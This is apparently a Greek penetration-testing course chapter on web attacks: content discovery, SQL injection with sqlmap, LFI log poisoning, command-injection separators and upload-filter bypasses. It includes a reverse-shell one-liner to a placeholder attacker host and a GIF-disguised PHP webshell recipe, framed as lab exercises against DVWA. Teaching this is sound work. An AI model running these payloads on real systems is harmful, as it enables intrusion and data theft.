> εννέα από τα δεκατρία. Το web είναι η μεγαλύτερη επιφάνεια επίθεσης σε αυτή τη διαδρομή και
> στην πραγματική ζωή.

## 1. Πώς λειτουργεί πραγματικά το HTTP

Πριν από τις επιθέσεις, τρία πράγματα που καθορίζουν τα πάντα.

### 1.1 Το HTTP δεν έχει μνήμη

Κάθε αίτηση είναι **ανεξάρτητη**. Ο εξυπηρετητής δεν θυμάται την προηγούμενη. Γι' αυτό υπάρχει
το **cookie**: ο εξυπηρετητής στέλνει `Set-Cookie: PHPSESSID=abc123` και ο πελάτης το
επιστρέφει σε **κάθε** επόμενη αίτηση.

```text
Αίτηση 1:  POST /login.php   → Απόκριση: 302 Found + Set-Cookie: PHPSESSID=abc123
Αίτηση 2:  GET /admin.php    → Η αίτηση ΠΕΡΙΕΧΕΙ: Cookie: PHPSESSID=abc123
```

**Αυτό σημαίνει ότι μια επίθεση είναι συχνά μια σειρά αιτήσεων που πρέπει να κρατήσετε
συνδεδεμένες.** Εξ ου και η `-b cookies.txt` στην `curl` και το cookie jar στον Burp. Αν
χάσετε το cookie, χάνετε και την πιστοποίησή σας.

### 1.2 GET έναντι POST

| | **GET** | **POST** |
| --- | --- | --- |
| Πού πάνε τα δεδομένα | Στη **γραμμή URL** (`?user=x&pass=y`) | Στο **σώμα** της αίτησης |
| Ορατότητα | **Στα αρχεία καταγραφής, στο ιστορικό, στο Referer** | Μόνο στη μνήμη του εξυπηρετητή |
| Μέγεθος | Περιορισμένο (~2–8 KB) | Μεγάλο |
| Idempotent; | Ναι (θεωρητικά) | Όχι |
| Πού το βλέπετε σε CTF | **LFI, command injection** | **SQL injection σε φόρμες, uploads** |

> **Εύρημα από μόνο του:** κωδικοί σε παράμετρο GET καταλήγουν στα access logs του Apache, στο
> ιστορικό του φυλλομετρητή, και στην κεφαλίδα `Referer` που στέλνεται σε τρίτους. Αν δείτε
> `?password=` σε URL, αυτό είναι εύρημα, ανεξάρτητα από το αν εκμεταλλεύεστε κάτι άλλο.

### 1.3 Η αίτηση, κομμάτι προς κομμάτι

```http
POST /masteradmin/login.php HTTP/1.1          ← γραμμή αίτησης: μέθοδος + διαδρομή
Host: 192.168.56.106                          ← υποχρεωτικό από HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64)   ← συχνά ευάλωτο σε injection!
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 34                            ← πόσα bytes έχει το σώμα
Cookie: PHPSESSID=abc123                      ← η συνεδρία σας
                                              ← κενή γραμμή (υποχρεωτική)
username=admin&password=test                  ← το σώμα
```

**Τρία σημεία που οι αρχάριοι χάνουν χρόνο:**
1. Το **`Content-Length`** πρέπει να είναι σωστό. Αν αλλάξετε το σώμα χειροκίνητα και δεν
   ενημερώσετε το μήκος, ο εξυπηρετητής διαβάζει μισή αίτηση και «κρεμάει».
2. Το **`Content-Type`** για uploads είναι `multipart/form-data; boundary=----abc123` και το
   `boundary` πρέπει να εμφανίζεται ακριβώς μέσα στο σώμα.
3. Το **`User-Agent`** είναι *και αυτό είσοδος*. Αν η εφαρμογή το γράφει σε αρχείο καταγραφής
   ή το βάζει σε SQL, είναι σημείο εισαγωγής — γι' αυτό το `sqlmap --level 3` το δοκιμάζει.

## 2. Εύρεση περιεχομένου (content discovery)

### 2.1 Τι είναι και γιατί λειτουργεί

**Δεν υπάρχει ευφυΐα εδώ.** Είναι μια **επίθεση λεξικού στον χώρο των URL**. Ο εξυπηρετητής
σερβίρει ό,τι έχει και δεν διαφημίζει ευρετήριο, άρα το εργαλείο ζητά `/admin`, `/backup`,
`/config.php` … ένα προς ένα, και **ταξινομεί την απόκριση**.

**Τι είναι ένα «wordlist»;** Ένα απλό αρχείο κειμένου, **μία λέξη ανά γραμμή**. Τίποτα άλλο.
Όλες οι επιθέσεις λεξικού σε αυτή τη διαδρομή — περιεχόμενο, κωδικοί, χρήστες — είναι η ίδια
ιδέα: δοκίμασε κάθε γραμμή του αρχείου.

```bash
wc -l /usr/share/dirb/wordlists/common.txt
sort -u /usr/share/wordlists/rockyou.txt | wc -l
head -5 /usr/share/dirb/wordlists/common.txt
```

```text
4612
14344392
admin
login
index.php
```

### 2.2 Τα τρία εργαλεία

```bash
dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt
gobuster dir -u http://TARGET/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak -t 50
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/rockyou.txt -mc 200,301,403 -fs 1234
```

| Εργαλείο | Δυνατό σημείο | Σημαντικές σημαίες |
| --- | --- | --- |
| **`dirb`** | Απλό, έρχεται με το Kali, **αναδρομή σε καταλόγους** | `-X .php` (καταλήξεις), `-r` (χωρίς αναδρομή) |
| **`gobuster`** | Γρήγορο (Go), καλό για **υποτομείς** | `-x php,txt` (καταλήξεις), `-t 50` (νήματα), `-k` (αγνόησε πιστοποιητικό) |
| **`ffuf`** | **Το πιο ευέλικτο** — φίλτρα ανά απόκριση | `FUZZ` (θέση), `-mc` (match codes), `-fc` (filter codes), `-fs` (filter size), `-fr` (filter regex) |

> **Το `FUZZ` της `ffuf` είναι η ουσία.** Μπορείτε να το βάλετε **οπουδήποτε**: στη διαδρομή
> (`/FUZZ/index.php`), στην παράμετρο (`?id=FUZZ`), ακόμα και στην κεφαλίδα. Αυτό την κάνει
> εργαλείο για **όλα** τα είδη brute force, όχι μόνο για διαδρομές.

### 2.3 Η κλιμάκωση λεξικών — το πιο συχνό λάθος

```text
dirb/common.txt                         4.612    «αρκετά για πρώτη ματιά»
dirb/big.txt                           20.469    ← εδώ βρίσκονται τα περισσότερα CTF
directory-list-2.3-medium.txt         220.459    αργό αλλά διεξοδικό
SecLists/…/directory-list-2.3-big.txt 1.273.598  για όταν τα υπόλοιπα απέτυχαν
raft-large-directories.txt             ~114.000  προσανατολισμένο σε «πραγματικές» διαδρομές
```

**Το Μηχάνημα 9 το διδάσκει ρητά:** με `common.txt` βρίσκετε μόνο `/uploads/` — έναν φάκελο
μεταφορτώσεων **χωρίς εφαρμογή να φορτώνει**, δηλαδή προφανώς ελλιπή εικόνα. Με `big.txt`
εμφανίζεται το `/masteradmin/`. **Κανόνας: όταν η εικόνα είναι προφανώς ημιτελής, κλιμακώστε
πριν συμπεράνετε ότι το μηχάνημα είναι άδειο.**

### 2.4 Οι καταλήξεις που πρέπει να δοκιμάζετε πάντα

```bash
gobuster dir -u http://TARGET/ -w list.txt -x php,txt,bak,old,zip,sql,log,inc,swp,git,env
```

| Κατάληξη | Τι βρίσκει |
| --- | --- |
| `.php` / `.asp` / `.jsp` | **Το πραγματικό attack surface** μιας εφαρμογής |
| `.bak`, `.old`, `.orig`, `.save`, `~` | **Αντίγραφα ασφαλείας που ο συντάκτης ξέχασε** — συχνά περιέχουν κωδικούς |
| `.zip`, `.tar.gz`, `.sql` | Ολόκληρο το site ή τη βάση |
| `.log` | Αρχεία καταγραφής με αιτήσεις, tokens, κωδικούς |
| `.git`, `.env`, `.htaccess`, `.htpasswd` | **Το `.env` περιέχει συχνά DB_PASSWORD.** Το `.git/` μπορεί να δώσει ολόκληρο το ιστορικό |
| `.swp`, `.inc` | Αρχεία επεξεργαστή και συμπεριλαμβανόμενα που σερβίρονται ως κείμενο |

## 3. Οι πέντε κατηγορίες επιθέσεων web αυτής της διαδρομής

| Κατηγορία | Τι είναι | Μηχανήματα |
| --- | --- | --- |
| **SQL Injection** | Η είσοδός σας γίνεται **κώδικας βάσης δεδομένων** | 9, 10 (έμμεσα), 1 |
| **LFI / RFI** | Η είσοδός σας γίνεται **διαδρομή αρχείου** που συμπεριλαμβάνεται | 10, 12 |
| **OS Command Injection** | Η είσοδός σας γίνεται **μέρος μιας εντολής κελύφους** | 6, 10, 12 |
| **Ανεπαρκής έλεγχος μεταφορτώσεων** | Ανεβάζετε **εκτελέσιμο** αρχείο | 9, 10, 11, 13 |
| **Ευπάθειες CMS / πρόσθετων** | Έτοιμο exploit σε Drupal, WordPress, Koken | 1, 3, 4, 7, 11, 12 |

**Κοινός παρονομαστής και των πέντε:** *μη έγκυρη είσοδος φτάνει σε έναν «αποδέκτη»
(sink) που δεν έπρεπε.* Ο αποδέκτης είναι η βάση δεδομένων, το σύστημα αρχείων, το κέλυφος,
ή ο διερμηνέας. **Αν μάθετε να ονομάζετε τον αποδέκτη, βρίσκετε τις ευπάθειες με επιθεώρηση
και όχι με τύχη.**

### 3.1 SQL Injection — τι ακριβώς συμβαίνει

Η εφαρμογή **συμβαδίζει** (concatenates) την είσοδό σας μέσα σε ένα ερώτημα:

```php
$q = "SELECT * FROM users WHERE username='$u' AND password='$p'";
```

Δίνετε `admin' -- ` και το ερώτημα γίνεται:

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password=''
```

**Το `-- ` ξεκινά σχόλιο στη SQL (το κενό μετά τις παύλες είναι υποχρεωτικό στη MySQL)**, άρα ο
έλεγχος κωδικού **διαγράφεται**. Μπαίνετε ως admin χωρίς κωδικό. Η είσοδός σας **βγήκε από το
πεδίο των δεδομένων και έγινε κώδικας**.

**Τρεις τεχνικές απόδειξης:**

| Τεχνική | Πώς λειτουργεί | Τι βλέπετε |
| --- | --- | --- |
| **Boolean-blind** | `AND 1=1` (αληθές) έναντι `AND 1=2` (ψευδές) | **Διαφορετικό μήκος σελίδας** ή διαφορετικός κωδικός |
| **Time-based** | `AND SLEEP(5)` | **Καθυστέρηση 5 δευτερολέπτων** στην απόκριση |
| **UNION** | `UNION SELECT NULL,NULL,...` | **Τα δεδομένα τυπώνονται μέσα στη σελίδα** |
| **Error-based** | `'` ή `"` | **Μήνυμα σφάλματος βάσης** που αποκαλύπτει πίνακες/στήλες |

**Η ανίχνευση είναι πάντα η ίδια:** βάλτε `'`, `"`, `` ` ``, `)`, `--` και κοιτάξτε για
(α) σφάλμα βάσης, (β) αλλαγή στο μήκος της σελίδας, (γ) διαφορετικό κωδικό κατάστασης.
Δέκα δευτερόλεπτα δουλειάς, και σας λέει αν το `sqlmap` έχει καν κάτι να δουλέψει.

### 3.2 `sqlmap` — σημαία προς σημαία

```bash
sqlmap -u "http://TARGET/login.php" --data="username=a&password=b" -p username \
       --batch --level 3 --risk 2 --dbs
```

| Σημαία | Τι σημαίνει | Πότε τη χρειάζεστε |
| --- | --- | --- |
| `-u URL` | Ο στόχος | — |
| `--data` | **Σώμα POST** | Για φόρμες με μέθοδο POST |
| `-p username` | **Δοκίμασε μόνο αυτή την παράμετρο** | Αφού έχετε ήδη βρει ποια είναι — μεγάλη εξοικονόμηση χρόνου |
| `--forms` | Φέρε τη σελίδα, διάβασε τη `<form>`, δοκίμασε όλα τα πεδία | Όταν δεν θέλετε να γράψετε αίτηση με το χέρι |
| `--batch` | **Μην ρωτάς ποτέ** — πάρε τις προεπιλογές | Υποχρεωτικό για αυτοματοποιημένες εκτελέσεις |
| `--level 3` | Δοκίμασε και `User-Agent`, `Referer`, cookies | Επίπεδα 4–5 δοκιμάζουν και άλλες κεφαλίδες |
| `--risk 2` | Πόσο **επικίνδυνα** επιτρέπεται να είναι τα payloads | **Το risk 3 προσθέτει time-based και βαριά `OR` που μπορεί να αλλοιώσουν δεδομένα — απαιτεί γραπτή άδεια σε πραγματικό σύστημα** |
| `--dbs` | Λίστα βάσεων | — |
| `-D NAME --tables` | Λίστα πινάκων μιας βάσης | — |
| `-T NAME --dump` | **Τυπώνει τις γραμμές** | — |
| `--dump-all` | Όλα, παντού | **Προσοχή:** σε μεγάλο σύστημα είναι τεράστιο και θορυβώδες |
| `--os-shell` | Προσπάθησε να δώσει κέλυφος | Χρειάζεται `FILE` privilege και εγγράψιμο document root |
| `--tamper=space2comment` | Μετασχηματίζει το payload για να ξεγελάσει WAF | Όταν υπάρχει φίλτρο |

**Το `sqlmap` είναι εργαλείο, όχι υποκατάστατο της κατανόησης.** Όταν αποτυγχάνει, ο λόγος
είναι συνήθως ένας από τρεις: δεν του είπατε **πού** είναι η ευάλωτη παράμετρος, χρειάζεται
πιστοποίηση (`--cookie=`), ή η εισαγωγή είναι **δεύτερης τάξης** (τα δεδομένα αποθηκεύονται
πρώτα και χρησιμοποιούνται αργότερα). **Επιβεβαιώστε χειροκίνητα με ένα `'` πρώτα.**

**Η διόρθωση είναι πάντα η ίδια:** prepared statements / bound parameters, ποτέ συμβολοσειρά.

### 3.3 LFI και RFI

```php
include($_GET['page'] . ".php");     // LFI με προσαρτημένη κατάληξη
include($_GET['page']);              // LFI χωρίς φίλτρο — το εύκολο
include("http://".$_GET['url']);     // RFI (απαιτεί allow_url_include=On)
```

**LFI (Local File Inclusion):** διαβάζετε **τοπικά** αρχεία. **RFI (Remote):** φέρνετε αρχείο
από δικό σας εξυπηρετητή — πολύ πιο ισχυρό, αλλά σπάνιο γιατί η `allow_url_include` είναι
απενεργοποιημένη από προεπιλογή.

**Τρία πράγματα που πρέπει να ξέρετε για το LFI:**

**(α) Το πρόβλημα της προσαρτημένης κατάληξης.** Αν ο κώδικας προσθέτει `.php`, τότε
`?page=/etc/passwd` ψάχνει το `/etc/passwd.php` και αποτυγχάνει. Λύσεις:
- **`php://filter`** (δείτε παρακάτω) — ο wrapper μπαίνει μπροστά, άρα το `.php` καταλήγει
  σε ακίνδυνο μέρος.
- **Null byte** (`%00`) — μόνο σε PHP < 5.3.4, πια ιστορικό.
- **Directory traversal σε κατάλογο** — `?page=../../etc/passwd/` δεν δουλεύει για αρχεία,
  αλλά `?page=php://filter/.../resource=index` ναι.

**(β) Ο wrapper που πρέπει να αποστηθίσετε:**

```text
php://filter/convert.base64-encode/resource=config
```

Διαβάζει το `config.php`, το **κωδικοποιεί σε base64 πριν το συμπεριλάβει**, και σας δίνει τον
**πηγαίο κώδικα** αντί για το εκτελεσμένο αποτέλεσμα. Έτσι ανακτάτε `wp-config.php`,
`configuration.php`, `.env`, `config/database.php` — δηλαδή **τα διαπιστευτήρια της βάσης**.

**(γ) Το LFI από μόνο του μόνο διαβάζει.** Για εκτέλεση κώδικα πρέπει να κάνετε τον στόχο να
**γράψει** ένα αρχείο που ελέγχετε σε **προβλέψιμη** διαδρομή, και μετά να το συμπεριλάβετε:

| Πρωτόγονη | Πού γράφει | Πώς την εκμεταλλεύεστε |
| --- | --- | --- |
| **Δηλητηρίαση αρχείου καταγραφής** | `/var/log/apache2/access.log` | Φτιάξτε αίτηση με **PHP στο `User-Agent`** και μετά συμπεριλάβετε το αρχείο |
| **Δηλητηρίαση SMTP** | `/var/mail/<user>` | Στείλτε email με **PHP στο `MAIL FROM:`** — Μηχάνημα 12 |
| **Αρχεία συνεδρίας** | `/var/lib/php/sessions/sess_<ID>` | Γράψτε PHP σε μια παράμετρο που αποθηκεύεται στη συνεδρία |
| **`/proc/self/environ`** | Περιβάλλον της ίδιας της διεργασίας | Περνάει το `User-Agent` μέσα — παλιές εκδόσεις PHP |
| **Εξαγωγή NFS** | Κατάλογος που εξάγεται | Γράψτε από άλλο μηχάνημα |
| **Ανέβασμα αρχείου** | `uploads/<md5>.gif` | Μηχανήματα 10, 13 |

### 3.4 Command Injection

Η εφαρμογή περνά την είσοδό σας σε κέλυφος:

```php
system("ping -c 4 " . $_GET['host']);
```

Δίνετε `127.0.0.1; id` και εκτελείται `ping -c 4 127.0.0.1; id`.

**Οι διαχωριστές που πρέπει να δοκιμάσετε:**

| Payload | Αποτέλεσμα |
| --- | --- |
| `; id` | Εκτέλεση **διαδοχική**, ανεξάρτητα |
| `\| id` | Σωλήνωση — τρέχει το επόμενο |
| `\|\| id` | Μόνο αν το πρώτο **απέτυχε** |
| `&& id` | Μόνο αν το πρώτο **πέτυχε** |
| `` `id` `` | Υποκατάσταση εντολής |
| `$(id)` | Υποκατάσταση — **προτιμητέα**, φωλιάζει |
| `%0a id` | **URL-encoded newline** — όταν τα σύμβολα φιλτράρονται |
| `%0d%0a` | CRLF — για injection σε κεφαλίδες |

**Αν τα σύμβολα αφαιρούνται, βρείτε τι επιζεί.** Στείλτε τη συμβολοσειρά `;|&$\`(){}[]<>` ως
μία είσοδο και δείτε ποιοι χαρακτήρες επιστρέφουν. Τα φίλτρα είναι συνήθως ένα `str_replace`
με μικρή λίστα — και η λίστα σχεδόν πάντα ξεχνάει κάτι.

**Το URL-encoding είναι υποχρεωτικό.** Σε ένα query string το `&` διαχωρίζει παραμέτρους και
το `>` είναι δεσμευμένο. Χωρίς κωδικοποίηση το payload κόβεται στην πρώτη `&` και **δεν
συμβαίνει τίποτα** — που μοιάζει με χαλασμένο shell. Παράγετέ το, μην το πληκτρολογείτε:

```bash
python3 -c "import urllib.parse as u; print(u.quote(\"bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\"))"
```

### 3.5 Μεταφορτώσεις αρχείων — άμυνες και παρακάμψεις

**Στόχος:** να μπει ένα αρχείο **σε κατάλογο που ο εξυπηρετητής εκτελεί**. Κάθε άμυνα έχει
τυπική παράκαμψη:

| Άμυνα | Παράκαμψη |
| --- | --- |
| **Μαύρη λίστα καταλήξεων** (`.php` μπλοκαρισμένο) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, **διαφορετική κεφαλαία/πεζή** (`.pHp`), `.php.jpg`, `.php%00.jpg` (null byte σε παλιά PHP) |
| **Έλεγχος MIME** (`Content-Type: image/jpeg`) | **Αλλάξτε την κεφαλίδα στον Burp** — είναι *πλήρως ελεγχόμενη από τον πελάτη*, άρα άχρηστη |
| **`getimagesize()` / magic bytes** | **Πολύγλωσσο αρχείο:** `printf 'GIF89a;\n' \| cat - shell.php > shell.gif` |
| **Λευκή λίστα καταλήξεων + έλεγχος περιεχομένου** | **Ελέγξτε το όνομα:** αν η κατάληξη προέρχεται από *εσάς* (Μηχάνημα 13), κερδίζετε |
| **Τυχαίο όνομα αρχείου** | Αν είναι `md5($name . rand(1,100))` = **100 πιθανότητες** → brute force με `ffuf` |

**Το πιο ισχυρό δίδαγμα αυτής της διαδρομής:** στο Μηχάνημα 13 ο προγραμματιστής **δήλωσε**
μια `$allowed_ext` και **δεν τη χρησιμοποίησε ποτέ**. Έλεγξε το *περιεχόμενο* και όχι το *όνομα*.
Αυτή η ασυμμετρία είναι όλη η ευπάθεια.

**Η σωστή διόρθωση:** επανα-κωδικοποιήστε την εικόνα (καταστρέφει οποιοδήποτε ενσωματωμένο
κόμβο), αποθηκεύστε **έξω** από το document root, απενεργοποιήστε τον διερμηνέα σε αυτόν τον
κατάλογο (`php_admin_flag engine off`), και **μην αντιστοιχίζετε ποτέ προσαρμοσμένη κατάληξη
στον χειριστή PHP**.

## Ασκήσεις

Χρησιμοποιήστε έναν σκόπιμα ευπαθή τοπικό στόχο — **ποτέ πραγματικό ιστότοπο**. Το [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) και το [DVWA](https://github.com/digininja/DVWA) τρέχουν σε Docker με μία εντολή.

1. **Εύρεση περιεχομένου.** Τρέξτε `gobuster` στο DVWA με το `common.txt` και μετά με `-x php,txt,bak`. Σημειώστε τι βρήκε η σημαία καταλήξεων που δεν βρήκε το πρώτο πέρασμα.
2. **Κωδικοί κατάστασης.** Βρείτε ένα `403` και ένα `401` στον ίδιο στόχο. Εξηγήστε στις σημειώσεις σας γιατί χρειάζονται διαφορετική αντιμετώπιση.
3. **SQL injection, χειροκίνητα.** Λύστε το SQLi του DVWA στο *low*, μετά στο *medium* και *high*. Μόνο τότε τρέξτε `sqlmap` στο *low* και συγκρίνετε τι έκανε με το τι κάνατε εσείς.
4. **LFI.** Χρησιμοποιήστε το `php://filter/convert.base64-encode/resource=` για να διαβάσετε τον πηγαίο κώδικα ενός αρχείου PHP στο DVWA. Αποκωδικοποιήστε το και βρείτε ένα μυστικό που η σελίδα δεν εμφανίζει ποτέ.
5. **Command injection.** Λύστε το Command Injection του DVWA στο *low*, μετά βρείτε τη μαύρη λίστα που εφαρμόζει στο *medium* και παρακάμψτε την με έναν χαρακτήρα που το φίλτρο ξέχασε.
6. **Μεταφόρτωση.** Φτιάξτε έναν PHP one-liner που εκτελεί το όρισμα `c` (η συνάρτηση `system` με το `$_GET['c']`), τοποθετήστε το μέσα σε ένα έγκυρο GIF με `cat`, ανεβάστε το κάπου που ελέγχει magic bytes και εκτελέστε το.

## 5. Έλεγχος γνώσεων

<details>
<summary><b>1.</b> Γιατί το <code>--</code> χρειάζεται κενό μετά στη MySQL;</summary>

Επειδή η MySQL αναγνωρίζει ως σχόριο **μόνο** `--` **ακολουθούμενο από κενό** (ή τέλος γραμμής).
Το `--x` ερμηνεύεται ως όνομα, όχι ως σχόριο. Άρα το `admin'-- ` κλείνει το ερώτημα αλλά το
`admin'--` όχι. Εναλλακτικά: `#` (σχόριο MySQL μέχρι το τέλος της γραμμής).
</details>

<details>
<summary><b>2.</b> Πώς αποδεικνύετε μια «boolean-blind» εισαγωγή χωρίς να δείτε δεδομένα;</summary>

Στέλνετε **δύο** αιτήσεις που διαφέρουν μόνο στην αλήθεια της συνθήκης:
`… AND 1=1-- -` και `… AND 1=2-- -`. Αν η πρώτη επιστρέψει τη **κανονική** σελίδα και η
δεύτερη μια **διαφορετική** (άλλο μήκος, άλλο redirect, άλλο μήνυμα), τότε το ερώτημα
εκτέλεσε τη συνθήκη σας → υπάρχει εισαγωγή. Το `sqlmap` το αυτοματοποιεί ακριβώς έτσι.
</details>

<details>
<summary><b>3.</b> Τι κάνει ο wrapper <code>php://filter/convert.base64-encode/resource=config</code>;</summary>

Περνά το αρχείο `config.php` από έναν **κωδικοποιητή base64 πριν** το συμπεριλάβει η PHP. Έτσι
λαμβάνετε τον **πηγαίο κώδικα** ως κείμενο, όχι το εκτελεσμένο αποτέλεσμα, και τον
αποκωδικοποιείτε τοπικά. Επιπλέον, επειδή ο wrapper βρίσκεται μπροστά, η κατάληξη `.php` που
προσαρτά ο κώδικας καταλήγει σε αβλαβές σημείο — γι' αυτό παρακάμπτει φίλτρα κατάληξης.
</details>

<details>
<summary><b>4.</b> Ποια η διαφορά LFI και RFI, και γιατί το RFI είναι σπάνιο;</summary>

**LFI** συμπεριλαμβάνει **τοπικά** αρχεία — μόνο ανάγνωση (ή εκτέλεση αν δηλητηριάσετε πρώτα
ένα αρχείο). **RFI** συμπεριλαμβάνει αρχείο **από απομακρυσμένο URL**, άρα εκτελεί άμεσα δικό
σας κώδικα. Το RFI απαιτεί `allow_url_include = On`, που είναι **Off από προεπιλογή** από την
PHP 5.2 — γι' αυτό στη φύση βλέπετε σχεδόν μόνο LFI.
</details>

<details>
<summary><b>5.</b> Γιατί το MIME-type check δεν είναι έλεγχος ασφαλείας;</summary>

Γιατί η κεφαλίδα `Content-Type` στέλνεται **από τον πελάτη**. Ο επιτιθέμενος την αλλάζει με
ένα κλικ στον Burp σε `image/jpeg` ενώ ανεβάζει PHP. Έλεγχος που βασίζεται σε δεδομένο που
ελέγχει πλήρως ο επιτιθέμενος **δεν είναι έλεγχος**.
</details>

<details>
<summary><b>6.</b> Γιατί πρέπει να URL-encode-άρετε ένα reverse shell σε query string;</summary>

Γιατί `&` διαχωρίζει παραμέτρους, `>` είναι δεσμευμένος χαρακτήρας, και τα κενά δεν επιτρέπονται.
Το payload `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` χωρίς κωδικοποίηση **κόβεται στην πρώτη
`&`**, άρα ο εξυπηρετητής λαμβάνει `cmd=bash -i >` και δεν συμβαίνει τίποτα. Το `%26` είναι το
`&` και το `%3E` το `>`.
</details>

## 6. Σημειωμένες εντολές

### 6.1 `curl` — η κύρια σημαία ανά σημαία

```bash
curl -s -k -i -X POST -H 'Content-Type: application/json' \
     -b cookies.txt -c cookies.txt \
     -d '{"user":"admin"}' \
     -F 'file=@shell.php' \
     -o out.html -w '%{http_code} %{size_download}\n' \
     http://TARGET/login.php
```

| Σημαία | Σημασία |
| --- | --- |
| `-s` | **silent** — χωρίς μπάρα προόδου (υποχρεωτικό σε σωληνώσεις) |
| `-k` | **insecure** — αγνόησε μη έγκυρο πιστοποιητικό TLS |
| `-i` | Τύπωσε **και τις κεφαλίδες** |
| `-I` | **Μόνο** κεφαλίδες (μέθοδος HEAD) |
| `-X POST` | Μέθοδος (προσοχή: το `-d` την ορίζει αυτόματα σε POST) |
| `-H '…'` | Προσθήκη κεφαλίδας |
| `-b cookies.txt` | **Στείλε** αυτά τα cookies |
| `-c cookies.txt` | **Αποθήκευσε** τα cookies από την απόκριση |
| `-d '…'` | Σώμα `application/x-www-form-urlencoded` |
| `-F 'name=@file'` | **multipart/form-data** — για uploads. Το `@` σημαίνει «διάβασε αυτό το αρχείο» |
| `-o FILE` | Αποθήκευση του σώματος σε αρχείο |
| `-w '%{…}'` | **Τύπωσε μετρικές** μετά την ολοκλήρωση |
| `-L` | Ακολούθησε τις ανακατευθύνσεις |
| `--user u:p` | HTTP Basic Auth |

**Το `-w` είναι το μυστικό όπλο για σύγκριση αιτήσεων:**

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' "http://TARGET/?id=1"
curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' "http://TARGET/?id=1 AND 1=2-- -"
```

```text
200 4821 0.031
200 1204 0.029
```

`-o /dev/null` πετάει το σώμα, και μένουν **μόνο οι αριθμοί**. Εδώ: **4821 bytes έναντι
1204** = η ψευδής συνθήκη έδωσε διαφορετική σελίδα = **boolean-based SQL injection**. Αυτή η
σύγκριση δύο αριθμών είναι ο ταχύτερος τρόπος να αποδείξετε μια «τυφλή» εισαγωγή.

**Για time-based:**

```bash
curl -s -o /dev/null -w '%{time_total}\n' "http://TARGET/?id=1 AND SLEEP(5)-- -"
```
```text
5.031
```

**5,03 δευτερόλεπτα.** Η καθυστέρηση **είναι** η απόδειξη.

### 6.6 Η ροή μιας επίθεσης με SQL injection, από την αρχή ως το τέλος

```bash
# 1. Βρες τη φόρμα
dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt -X .php

# 2. Επιβεβαίωσε χειροκίνητα με ένα '
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' --data "username=a'&password=b" http://TARGET/login.php
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' --data "username=a&password=b"  http://TARGET/login.php

# 3. Άσε το sqlmap να χαρακτηρίσει την εισαγωγή
sqlmap -u "http://TARGET/login.php" --forms --batch --level 3 --risk 2

# 4. Δες τις βάσεις
sqlmap -u "http://TARGET/login.php" --data="username=a&password=b" -p username --batch --dbs

# 5. Δες τους πίνακες
sqlmap … --batch -D appdb --tables

# 6. Άδειασε τον πίνακα χρηστών
sqlmap … --batch -D appdb -T users --dump

# 7. Σύνδεση με τα διαπιστευτήρια που βρήκες
```

**Διαβάστε κάθε βήμα ως απόφαση, όχι ως ξόρκι.** Το βήμα 2 είναι το πιο σημαντικό: αν το `'`
δεν αλλάξει **τίποτα**, το `sqlmap` δεν έχει με τι να δουλέψει και θα σπαταλήσετε μισή ώρα.
Το βήμα 4–6 είναι **κλιμάκωση**: βάσεις → πίνακες → γραμμές, πάντα με αυτό το φίλτρο `-D … -T …`
ώστε να μην αδειάσετε κατά λάθος ολόκληρο τον εξυπηρετητή.

### 6.7 Ανέβασμα αρχείου με `curl -F`

```bash
curl -s -b cookies.txt -F 'file=@shell.gif;type=image/gif' \
     http://TARGET/masteradmin/upload.php
```

```text
{"status":"success","path":"uploads/9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c.gif"}
```

| Μέρος | Σημασία |
| --- | --- |
| `-b cookies.txt` | **Απαραίτητο** — χωρίς συνεδρία παίρνετε το `302` της σύνδεσης |
| `-F 'file=@shell.gif'` | Πεδίο με όνομα `file`, περιεχόμενο **από το αρχείο** (`@`) |
| `;type=image/gif` | **Υπερκάλυψη του MIME** — το κομμάτι που νικά τον έλεγχο MIME |
| Το JSON στην απόκριση | **Η διαδρομή όπου αποθηκεύτηκε** — διαβάστε τη, μην τη μαντέψετε |

**Το όνομα του πεδίου (`file`) πρέπει να ταιριάζει με αυτό που περιμένει η εφαρμογή.** Κοιτάξτε
τον πηγαίο κώδικα της φόρμας (`<input type="file" name="…">`) ή τα αποδεικτικά στοιχεία από
Burp. Λανθασμένο όνομα = «Το αρχείο δεν βρέθηκε» = σύγχυση.

### 6.8 `base64` — κωδικοποίηση και αποκωδικοποίηση

**Αναγνώριση base64 με το μάτι:** χαρακτήρες `A–Z a–z 0–9 + /` και **`=` ή `==` στο τέλος**
για συμπλήρωμα. Το μήκος είναι πάντα πολλαπλάσιο του 4.

**Τρεις παγίδες:**
1. **`echo` προσθέτει newline.** `echo 'x' | base64` κωδικοποιεί `x\n`, όχι `x`. Χρησιμοποιήστε
   **`printf '%s'`**.
2. **Είναι συχνά ένθετο.** Αποκωδικοποιήστε, κοιτάξτε το αποτέλεσμα, και **ρωτήστε αν είναι
   και αυτό κωδικοποιημένο**. Στο Μηχάνημα 6 υπάρχουν **τρία** επίπεδα base64.
3. **Μην χρησιμοποιείτε online εργαλεία.** Η επικόλληση δεδομένων πελάτη σε ιστοσελίδα τρίτου
   είναι διαρροή. Σε πραγματικό έργο, αυτό θα ήταν παράβαση συμβολαίου και ίσως νόμου.

### 6.9 `openssl passwd` — δημιουργία hash για την τεχνική `/etc/passwd`

```bash
openssl passwd -1 -salt ignite superpassword
openssl passwd -6 -salt xyz 'StrongPass!2024'
```

```text
$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0
$6$xyz$Q0f1...πολύ μακρύ...
```

`-1` = **MD5-crypt** (μορφή `$1$salt$hash`), `-6` = **SHA-512-crypt** (`$6$…`). Το `-salt`
είναι προαιρετικό (χωρίς αυτό παράγεται τυχαίο).

**Πού χρησιμοποιείται:** στο Μηχάνημα 1, για να φτιάξετε μια γραμμή στο `/etc/passwd` με
